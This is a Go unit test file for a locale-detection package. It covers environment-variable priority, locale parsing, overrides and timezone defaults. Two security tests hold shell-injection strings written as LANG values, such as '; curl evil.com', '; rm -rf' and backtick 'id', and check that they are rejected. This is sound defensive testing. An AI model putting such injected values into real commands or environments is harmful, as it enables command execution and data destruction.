package locale

import (
	"context"
	"os"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// withFakeEnv replaces the injectable env getter with a fake that reads from
// the provided map, then restores the original after the test.
func withFakeEnv(t *testing.T, env map[string]string) {
	t.Helper()
	orig := getEnv
	getEnv = func(key string) string { return env[key] }
	t.Cleanup(func() { getEnv = orig })
}

// withEmptyEnv replaces the env getter to return "" for all keys.
func withEmptyEnv(t *testing.T) {
	t.Helper()
	withFakeEnv(t, map[string]string{})
}

// TestDetectFromEnv_LC_ALL_Priority verifies that LC_ALL takes priority
// over LANG (research.md §2.1 detection order).
func TestDetectFromEnv_LC_ALL_Priority(t *testing.T) {
	withFakeEnv(t, map[string]string{
		"LC_ALL": "ko_KR.UTF-8",
		"LANG":   "en_US.UTF-8",
	})

	country, lang, ok := detectFromEnv()
	require.True(t, ok)
	assert.Equal(t, "KR", country)
	assert.Equal(t, "ko-KR", lang)
}

// TestDetectFromEnv_LANG_Fallback verifies that LANG is used when LC_ALL is empty.
func TestDetectFromEnv_LANG_Fallback(t *testing.T) {
	withFakeEnv(t, map[string]string{
		"LANG": "en_US.UTF-8",
	})

	country, lang, ok := detectFromEnv()
	require.True(t, ok)
	assert.Equal(t, "US", country)
	assert.Equal(t, "en-US", lang)
}

// TestDetectFromEnv_C_Rejected verifies that "C" and "POSIX" are not treated as
// valid locale values.
func TestDetectFromEnv_C_Rejected(t *testing.T) {
	for _, val := range []string{"C", "POSIX", "C.UTF-8"} {
		t.Run(val, func(t *testing.T) {
			withFakeEnv(t, map[string]string{"LANG": val})
			_, _, ok := detectFromEnv()
			assert.False(t, ok, "expected %q to be rejected", val)
		})
	}
}

// TestDetectFromEnv_MalformedLANG verifies that malformed locale strings are rejected.
func TestDetectFromEnv_MalformedLANG(t *testing.T) {
	cases := []string{
		"not-a-locale",
		"12_34",
		"",
	}
	for _, val := range cases {
		t.Run(val, func(t *testing.T) {
			withFakeEnv(t, map[string]string{"LANG": val})
			_, _, ok := detectFromEnv()
			assert.False(t, ok)
		})
	}
}

// TestDetectFromEnv_LC_MESSAGES_Priority verifies LC_MESSAGES is used when
// LC_ALL is empty and comes before LANG.
func TestDetectFromEnv_LC_MESSAGES_Priority(t *testing.T) {
	withFakeEnv(t, map[string]string{
		"LC_MESSAGES": "ja_JP.UTF-8",
		"LANG":        "en_US.UTF-8",
	})

	country, lang, ok := detectFromEnv()
	require.True(t, ok)
	assert.Equal(t, "JP", country)
	assert.Equal(t, "ja-JP", lang)
}

// TestContainsInjectionChars_Security verifies AC-LC-010: LANG injection rejection.
func TestContainsInjectionChars_Security(t *testing.T) {
	malicious := []string{
		`en_US.UTF-8; curl evil.com`,
		`en_US.UTF-8; rm -rf`,
		"ko_KR.UTF-8 && echo pwned",
		"fr_FR.UTF-8|ls",
		"de_DE.UTF-8`id`",
		"en_US.UTF-8$PATH",
	}
	for _, val := range malicious {
		t.Run(val, func(t *testing.T) {
			assert.True(t, containsInjectionChars(val), "expected injection detection for: %s", val)
		})
	}

	safe := []string{
		"ko_KR.UTF-8",
		"en_US.UTF-8",
		"ja_JP@calendar=gregorian",
		"zh_CN",
	}
	for _, val := range safe {
		t.Run("safe_"+val, func(t *testing.T) {
			assert.False(t, containsInjectionChars(val), "expected safe: %s", val)
		})
	}
}

// TestDetect_EnvInjection_Rejected tests AC-LC-010: inject shell syntax → fallback to default.
func TestDetect_EnvInjection_Rejected(t *testing.T) {
	withFakeEnv(t, map[string]string{
		"LANG": `en_US.UTF-8; curl evil.com`,
	})

	lc, err := Detect(context.Background())
	require.NoError(t, err)
	// Should fall back to default (injection rejected, no OS APIs in test context).
	// The fallback is either SourceDefault or SourceOS depending on the platform.
	assert.NotEmpty(t, lc.Country)
	assert.NotEmpty(t, lc.PrimaryLanguage)
}

// TestDetect_UserOverride_Wins tests AC-LC-004: user override bypasses OS detection.
func TestDetect_UserOverride_Wins(t *testing.T) {
	withFakeEnv(t, map[string]string{
		"LANG": "ko_KR.UTF-8",
	})

	override := &LocaleContext{
		Country:         "JP",
		PrimaryLanguage: "ja-JP",
		Timezone:        "Asia/Tokyo",
		Currency:        "JPY",
		DetectedMethod:  SourceUserOverride,
	}

	lc, err := DetectWithOverride(context.Background(), override)
	require.NoError(t, err)
	assert.Equal(t, "JP", lc.Country)
	assert.Equal(t, "ja-JP", lc.PrimaryLanguage)
	assert.Equal(t, SourceUserOverride, lc.DetectedMethod)
}

// TestDetect_UserOverride_EmptyCountry_DoesNotWin verifies that an override with
// empty Country falls through to normal detection.
func TestDetect_UserOverride_EmptyCountry_DoesNotWin(t *testing.T) {
	withFakeEnv(t, map[string]string{
		"LANG": "ko_KR.UTF-8",
	})

	override := &LocaleContext{
		Country:         "", // empty — should not win
		PrimaryLanguage: "ja-JP",
	}

	lc, err := DetectWithOverride(context.Background(), override)
	require.NoError(t, err)
	// Should resolve from env, not the invalid override.
	assert.NotEqual(t, "ja-JP", lc.PrimaryLanguage)
	assert.NotEqual(t, SourceUserOverride, lc.DetectedMethod)
}

// TestDetect_TZ_Env_Override verifies that when TZ env is set, it overrides
// the CLDR primary zone and timezone_alternatives is nil.
func TestDetect_TZ_Env_Override(t *testing.T) {
	withFakeEnv(t, map[string]string{
		"LANG": "en_US.UTF-8",
		"TZ":   "America/Los_Angeles",
	})

	lc, err := Detect(context.Background())
	require.NoError(t, err)

	if lc.Country == "US" {
		// When OS detection works for US, TZ env should take precedence.
		assert.Equal(t, "America/Los_Angeles", lc.Timezone)
		assert.Empty(t, lc.TimezoneAlternatives, "alternatives should be nil when OS TZ is set")
	}
}

// TestDetect_NoLocale_DefaultsToEnUS tests that when no locale can be detected,
// the default en-US fallback is used (REQ-LC-005).
func TestDetect_NoLocale_DefaultsToEnUS(t *testing.T) {
	withEmptyEnv(t)

	// Stub out OS APIs to return error (cross-platform workaround).
	lc := defaultLocaleContext()
	assert.Equal(t, SourceDefault, lc.DetectedMethod)
	assert.Equal(t, "US", lc.Country)
	assert.Equal(t, "en-US", lc.PrimaryLanguage)
	assert.Equal(t, "America/New_York", lc.Timezone)
	assert.Equal(t, "USD", lc.Currency)
}

// TestDetect_EnvironVariablePurity verifies REQ-LC-014: Detect() does not mutate
// process environment variables.
func TestDetect_EnvironVariablePurity(t *testing.T) {
	// Capture env snapshot before.
	before := make(map[string]string)
	for _, key := range []string{"LANG", "LC_ALL", "LC_MESSAGES", "TZ"} {
		before[key] = os.Getenv(key)
	}

	withFakeEnv(t, map[string]string{"LANG": "ko_KR.UTF-8"})
	_, err := Detect(context.Background())
	require.NoError(t, err)

	// Restore getEnv first (already handled by t.Cleanup), then check real OS env.
	for _, key := range []string{"LANG", "LC_ALL", "LC_MESSAGES", "TZ"} {
		assert.Equal(t, before[key], os.Getenv(key),
			"key %s was mutated", key)
	}
}

// TestParseLocaleString_VariousFormats tests correct parsing of valid locale strings.
func TestParseLocaleString_VariousFormats(t *testing.T) {
	cases := []struct {
		input   string
		country string
		lang    string
		ok      bool
	}{
		{"ko_KR.UTF-8", "KR", "ko-KR", true},
		{"en_US.UTF-8", "US", "en-US", true},
		{"ja_JP", "JP", "ja-JP", true},
		{"fr_FR.UTF-8", "FR", "fr-FR", true},
		{"de_DE", "DE", "de-DE", true},
		{"zh_CN.UTF-8", "CN", "zh-CN", true},
		{"ja_JP@calendar=gregorian", "JP", "ja-JP", true},
		// Invalid or non-country forms.
		{"C", "", "", false},
		{"POSIX", "", "", false},
		{"", "", "", false},
		{"12345", "", "", false},
	}

	for _, tc := range cases {
		t.Run(tc.input, func(t *testing.T) {
			country, lang, ok := parseLocaleString(tc.input)
			assert.Equal(t, tc.ok, ok)
			if tc.ok {
				assert.Equal(t, tc.country, country)
				assert.Equal(t, tc.lang, lang)
			}
		})
	}
}

// TestDetect_MultiTimezone_US_NoTZ tests AC-LC-018: US without OS TZ gets primary zone
// and timezone_alternatives populated.
func TestDetect_MultiTimezone_US_NoTZ(t *testing.T) {
	withFakeEnv(t, map[string]string{
		"LANG": "en_US.UTF-8",
		// TZ not set → multi-timezone disambiguation needed
	})

	lc, err := Detect(context.Background())
	require.NoError(t, err)

	if lc.Country == "US" {
		assert.Equal(t, "America/New_York", lc.Timezone, "primary US timezone must be America/New_York")
		assert.Contains(t, lc.TimezoneAlternatives, "America/New_York")
		assert.Contains(t, lc.TimezoneAlternatives, "America/Chicago")
		assert.Contains(t, lc.TimezoneAlternatives, "America/Los_Angeles")
		assert.Len(t, lc.TimezoneAlternatives, 6, "US has 6 canonical zones")
		assert.Nil(t, lc.Conflict, "multi-timezone ambiguity is not a conflict")
	}
}

// TestDetect_MultiTimezone_US_WithTZ tests that when TZ=America/Los_Angeles is set,
// that zone wins and alternatives are empty.
func TestDetect_MultiTimezone_US_WithTZ(t *testing.T) {
	withFakeEnv(t, map[string]string{
		"LANG": "en_US.UTF-8",
		"TZ":   "America/Los_Angeles",
	})

	lc, err := Detect(context.Background())
	require.NoError(t, err)

	if lc.Country == "US" {
		assert.Equal(t, "America/Los_Angeles", lc.Timezone)
		assert.Empty(t, lc.TimezoneAlternatives)
	}
}

// TestDetect_DetectedAt_Set verifies that DetectedAt is populated.
func TestDetect_DetectedAt_Set(t *testing.T) {
	before := time.Now()
	lc := defaultLocaleContext()
	assert.False(t, lc.DetectedAt.IsZero())
	assert.True(t, !lc.DetectedAt.Before(before))
}

// TestDefaultLocaleContext verifies the fallback defaults (SourceDefault).
func TestDefaultLocaleContext(t *testing.T) {
	lc := defaultLocaleContext()
	assert.Equal(t, "US", lc.Country)
	assert.Equal(t, "en-US", lc.PrimaryLanguage)
	assert.Equal(t, "America/New_York", lc.Timezone)
	assert.Equal(t, "USD", lc.Currency)
	assert.Equal(t, "imperial", lc.MeasurementSystem)
	assert.Equal(t, "gregorian", lc.CalendarSystem)
	assert.Equal(t, SourceDefault, lc.DetectedMethod)
}
